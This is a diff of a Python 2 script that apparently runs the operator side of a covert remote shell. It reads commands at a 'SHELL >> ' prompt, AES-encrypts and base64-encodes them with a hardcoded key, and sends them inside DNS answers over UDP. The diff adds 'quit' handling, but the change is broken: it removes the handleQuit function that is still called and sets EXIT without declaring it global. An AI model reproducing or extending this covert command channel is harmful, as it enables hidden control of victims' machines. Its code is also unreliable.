@@ -24,6 +24,7 @@ PROMPT = 'SHELL >> '
 #PROMPT_COLORED = '\033[33mSHELL\033[0m \033[35m>> \033[0m'
 BLOCK_SIZE = 32  # Block size for cipher object: must be 16, 24, or 32 for AES
 PADDING = '{'  # Character used for padding
+EXIT = 0 # Used to keep track of 'quit' command
 # REPLACE THIS WITH YOUR OWN KEY AND IV #
 secret = "TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B"
 iv = "1cYGbLz8qN4umT4c"
@@ -46,10 +47,6 @@ def decrypt(string):
   decoded = DecodeAES(cipher, string)
   return decoded
 
-def handleQuit(shellInput):
-  if shellInput in ['quit', 'exit']:
-    killApplication()
-
 def killApplication():
   print '\n\n--[ Connection Ended ]--\n'
   exit(0)
@@ -58,6 +55,7 @@ def spawnShell(answer, payload):
   # Spawns our Command Shell:
   shellInput = raw_input(PROMPT)
   handleQuit(shellInput)
+  if shellInput == 'quit': EXIT = 1 #Set program to exit cleanly
   if shellInput == '': spawnShell(answer, payload) # Prevents whitespace issues
   out = base64.b64encode(encrypt(shellInput))
   answer.add_answer(
@@ -117,6 +115,7 @@ def main():
 
       # Send back Response:
       udps.sendto(answer.pack(), addr)
+      if EXIT == 1: killApplication()
 
   except (KeyboardInterrupt, EOFError) as e:
     udps.close()
